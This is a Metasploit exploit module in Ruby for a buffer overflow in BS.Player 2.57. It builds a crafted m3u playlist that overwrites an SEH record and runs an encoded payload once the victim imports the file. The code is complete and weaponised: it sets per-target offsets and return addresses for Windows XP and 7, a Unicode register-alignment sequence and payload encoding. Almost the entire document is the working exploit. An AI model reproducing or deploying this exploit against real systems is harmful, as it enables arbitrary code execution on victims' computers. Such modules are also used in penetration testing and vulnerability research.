##
# $Id: $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Seh
 
    def initialize(info = {})
        super(update_info(info,
            'Name'      => 'BS.Player 2.57 Buffer Overflow Exploit (Unicode SEH)',
            'Description'   => %q{
                    This module exploits a buffer overflow in BS.Player 2.57. When
                    the playlist import is used to import a specially crafted m3u file,
                    a buffer overflow occurs allowing arbitrary code execution.
            },
            'License'       => MSF_LICENSE,
            'Author'        =>
                [
                    'C4SS!0 G0M3S ', # Original Exploit
                    'Chris Gabriel', # MSF Module
                    #Greets: Corelan team for mona.py & awesome tutorials
                ],
            'References'    =>
                [
                    [ 'URL', 'http://www.exploit-db.com/exploits/15934/' ]
                ],
            'DefaultOptions' =>
                {
                    'ExitFunction' => 'process',
                    #'InitialAutoRunScript' => 'migrate -f',
                },
            'Platform'  => 'win',
            'Payload'   =>
                {
                    'Space' => 2000,
                    'BadChars' => "\x00\x0a\x0d\x1a\x80",
                    'DisableNops' => true,
                    'StackAdjustment' => -3500,
                },
 
            'Targets'       =>
                [
                    [ 'Windows XP',
                        {
                            'Ret'       =>   "\x2f\x49",
                            'Offset'    =>   4102
                        }
                    ], # pop ecx # pop ebp # ret 0c | startnull,unicode,asciiprint,ascii {PAGE_EXECUTE_READWRITE} [bsplayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.5.7.1051 (bsplayer.exe)
                     
                    [ 'Windows 7',
                        {
                            'Ret'       =>   "\x2f\x49",
                            'Offset'    =>   4102
                        }
                    ], # pop ecx # pop ebp # ret 0c | startnull,unicode,asciiprint,ascii {PAGE_EXECUTE_READWRITE} [bsplayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.5.7.1051 (bsplayer.exe)
                ],
            'Privileged'    => false,
            'DisclosureDate'    => 'Jan 07 2010',
            'DefaultTarget' => 0))
 
        register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf.m3u']),], self.class)
 
    end
 
    def exploit
 
        nseh = "\x61\x42"
 
        align   = "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX  
        align  += "\x6d"                # PAD
        align  += "\x58"                # POP EAX
        align  += "\x6d"                # PAD
        align  += "\x50"                # PUSH EAX
        align  += "\x6d"                # PAD
        align  += "\xc3"                # RET
 
        if target == targets[0] then
            padding = rand_text_alpha_lower(1879)
        elsif target == targets[1] then
            padding = rand_text_alpha_lower(1931)
        end
 
        enc = framework.encoders.create('x86/unicode_mixed')
 
        register_to_align_to = "EAX"
 
        enc.datastore.import_options_from_hash({ 'BufferRegister' => register_to_align_to })
 
        unicodepayload = enc.encode(payload.encoded, nil, nil, platform)
         
        buffer  = "http://"
        buffer << rand_text_alpha_lower(target['Offset'])
        buffer << nseh
        buffer << target['Ret']
        buffer << align
        buffer << padding
        buffer << unicodepayload
 
        file_create(buffer)
 
    end
end
